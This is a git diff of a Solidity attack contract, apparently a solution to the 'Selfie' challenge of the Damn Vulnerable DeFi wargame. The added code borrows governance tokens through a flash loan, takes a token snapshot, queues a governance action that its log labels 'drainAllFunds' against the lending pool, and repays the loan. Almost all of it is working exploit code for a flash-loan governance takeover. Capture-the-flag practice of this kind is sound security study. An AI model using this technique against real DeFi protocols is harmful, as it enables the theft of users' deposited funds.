@@ -4,7 +4,7 @@ pragma solidity ^0.8.0;
 
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "@openzeppelin/contracts/utils/Address.sol";
-// import "../DamnValuableToken.sol";
+import "../DamnValuableTokenSnapshot.sol";
 import "hardhat/console.sol";
 
 // import {TheRewarderPool} from "../the-rewarder/TheRewarderPool.sol";
@@ -22,10 +22,11 @@ contract AttackSelfiePool {
 
     using Address for address;
 
-    IERC20 token ;
+    DamnValuableTokenSnapshot token ;
     address flashLoanPool ;
     address governance;
     address attacker;
+    uint256 actionId;
 
     constructor (
         address _token,
@@ -34,25 +35,29 @@ contract AttackSelfiePool {
     ) {
         // rewarderPool = TheRewarderPool(_rewardPool);
         flashLoanPool = _flashLoanPool;
-        token = IERC20(_token);
+        token = DamnValuableTokenSnapshot(_token);
+        governance = _governance;
         attacker = msg.sender;
     }
 
-    function attack(uint256 amt) external
+    function attack(uint256 amt) external returns (uint256)
     {   
+        
         console.log("Attack called for : ",amt);
         IFlashLoanerPool(flashLoanPool).flashLoan(amt);
-        
+        return actionId;
         // // Send Looted tokens to the attacker
         // uint256 rewards_balance = rewardToken.balanceOf(address(this));
         // rewardToken.transfer(attacker , rewards_balance );
     }
 
     function receiveTokens(address _token, uint256 amt) external {
-        console.log("Received Flash loan : ",amt);
+        console.log("Received Flashloan : ",amt);
         
-        console.log("");
-        governance.functionCall(
+        token.snapshot();
+
+        console.log("add QueueAction : drainAllFunds");
+        bytes memory returndata =  governance.functionCall(
             abi.encodeWithSignature(
                 "queueAction(address,bytes,uint256)",
                 flashLoanPool,
@@ -60,6 +65,8 @@ contract AttackSelfiePool {
                 0
             )
         ); 
+        actionId = abi.decode(returndata, (uint256));
+        console.log("Added Successfully: Id = ",actionId);
 
         // Transfer amt back to the pool
         IERC20(_token).transfer(flashLoanPool, amt);
